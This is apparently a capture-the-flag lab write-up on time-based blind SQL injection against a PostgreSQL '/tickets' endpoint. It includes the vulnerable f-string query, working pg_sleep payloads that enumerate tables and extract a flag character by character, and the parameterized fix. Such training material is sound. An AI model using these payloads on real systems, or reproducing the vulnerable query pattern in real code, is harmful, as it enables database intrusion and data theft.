# Level 2-2: Time-Based Blind SQLi

**URL:** `/tickets`

**Objective:** Extract the flag from a hidden table using time-based blind SQL injection. Unlike boolean-based blind, the response here is always `{"disponivel": false}` regardless of the injected condition. The only observable difference is response latency. Meaning this is even more powerful than boolean-based blind because it can be used even when the boolean response is not useful (e.g., the server always returns the same status, or the response is identical for true/false). Timing becomes the only information channel.

## Vulnerable Code

```python
query = f"SELECT id FROM bilhetes WHERE codigo = '{codigo}' AND disponivel = TRUE"
cur.execute(query)
row = cur.fetchone()
return jsonify({"disponivel": row is not None})
```

Same injection point as Level 2-1. The difference is the attacker's perspective: assume the boolean response is not useful (e.g., the server always returns the same status, or the response is identical for true/false).

## Core Primitive: `pg_sleep()`

PostgreSQL's `pg_sleep(seconds)` pauses query execution for the given duration. By injecting it into a subquery, the attacker controls whether the server takes 3 seconds or returns immediately. Most DBMS have similar functions (e.g., `SLEEP()` in MySQL, `WAITFOR DELAY` in SQL Server).

**Confirm timing injection:**

```sql
A1' AND 1=(SELECT 1 FROM (SELECT pg_sleep(3))a)--
```

The response takes ~3 seconds. Remove the payload and the response is immediate. Timing injection confirmed.

## Attack Chain

### Step 1 — Conditional sleep primitive

```sql
' AND 1=(SELECT 1 FROM (SELECT pg_sleep(CASE WHEN <condition> THEN 3 ELSE 0 END))a)--
```

If `<condition>` is true → server sleeps 3 seconds.  
If `<condition>` is false → server responds immediately.

This is functionally identical to boolean-based blind, with latency replacing the response field as the signal.

### Step 2 — Enumerate tables and confirm the target

Use `information_schema.tables` with timing to discover table names:

```sql
A1' AND 1=(SELECT 1 FROM (SELECT pg_sleep(CASE WHEN (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='unsuspecting_table')=1 THEN 3 ELSE 0 END))a)--
```

3-second delay → the table exists. Enumerate its columns with the same technique against `information_schema.columns`. Confirm the table has rows:

```sql
A1' AND 1=(SELECT 1 FROM (SELECT pg_sleep(CASE WHEN (SELECT COUNT(*) FROM unsuspecting_table)>=1 THEN 3 ELSE 0 END))a)--
```

3-second delay → at least one row exists.

### Step 3 — Extract flag length

```sql
A1' AND 1=(SELECT 1 FROM (SELECT pg_sleep(CASE WHEN (SELECT LENGTH(juice) FROM unsuspecting_table WHERE id=1)=27 THEN 3 ELSE 0 END))a)--
```

3-second delay → the flag is 27 characters long.

### Step 4 — Extract the flag character by character

```sql
A1' AND 1=(SELECT 1 FROM (SELECT pg_sleep(CASE WHEN (SELECT SUBSTRING(juice,1,1) FROM unsuspecting_table WHERE id=1)='J' THEN 3 ELSE 0 END))a)--
```

3-second delay → first character is `J`.

Repeat for each position. Any character that causes a delay is the correct one.

## Why this is harder to detect and mitigate than boolean-based

- No visible difference in the response body. WAFs and application-level filters that look for `true/false` differences are blind to this.
- Network delays can interfere with timed signals. Attackers compensate by using longer sleep intervals or averaging multiple requests.
- Completely passive from the database's perspective, no errors, no anomalous result sets.

## Fixed Code

```python
query = "SELECT id FROM bilhetes WHERE codigo = %s AND disponivel = TRUE"
cur.execute(query, (codigo,))
```

Parameterized queries prevent injection entirely. For defence in depth: implement request rate limiting on `/api/bilhete`. Time-based attacks require many sequential requests and are detectable by volume.
